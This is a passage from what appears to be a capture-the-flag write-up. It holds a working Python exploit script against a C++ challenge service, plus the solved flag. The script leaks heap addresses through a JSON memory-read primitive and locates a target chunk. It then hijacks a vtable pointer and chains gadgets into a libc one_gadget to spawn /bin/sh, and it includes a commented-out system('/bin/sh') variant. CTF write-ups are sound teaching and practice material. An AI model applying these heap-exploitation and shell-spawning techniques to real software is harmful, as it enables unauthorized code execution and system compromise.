assert (libcpp_base & 0xfff) == 0

print('\nleak the heap')
base64_chars_addr = vtable_addr + e.sym['_ZN6cereal6base64L5charsE'] - e.sym['_ZN5Toast3eatEv']
bytes_ = send_json(mem_read_json % (base64_chars_addr, 8, 32))
heap_addr = u64(bytes_)
print(f'{heap_addr=:#x}')

print('\nfind the congee chunk')
length, needle = 0x1000, 0x41424344
bytes_ = send_json(mem_read_json % (heap_addr, length, needle))
assert len(bytes_) == length, f'expected to read {length} bytes'
assert p64(needle) in bytes_, 'unable to find needle in the haystack, maybe try a larger search length?'
found_addr = heap_addr + bytes_.index(p64(needle)) - 16
print(f'FOUND THE CONGEE CHUNK! - {found_addr=:#x}')

"""
# one_gadget -f /usr/lib/x86_64-linux-gnu/libc.so.6

0xef4ce execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  rbx == NULL || {"/bin/sh", rbx, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp
"""

# 
# Approach 1: One-Gadget
# 

set_r12_0_gadget = libcpp_base + 0xf0a0c
set_rbx_0_gadget = libcpp_base + 0xf5e83
one_gadget_addr = libc_base + 0xef4ce
send_json(vptr_hijack_json % (
    found_addr + 0x08,
    set_r12_0_gadget,
    set_rbx_0_gadget,
    one_gadget_addr,
    0,
    0,
), True)

# 
# Approach 2: system("/bin/sh")
# 

# send_json(vptr_hijack_json % (
#     found_addr + 0x10,
#     found_addr + 0x18,
#     libc_base + 0x1740b1,
#     libc_base + libc.sym.system,
#     libc_base + next(libc.search(b'/bin/sh')),
#     libc_base + 0xa5688,
# ), True)

p.interactive()
```

## Flag

```text
crew{Pu2e_C3real_OrieNteD_Pro9ramM!ng_i5_wh@t_i_l1ke_to_cal1_it}
```
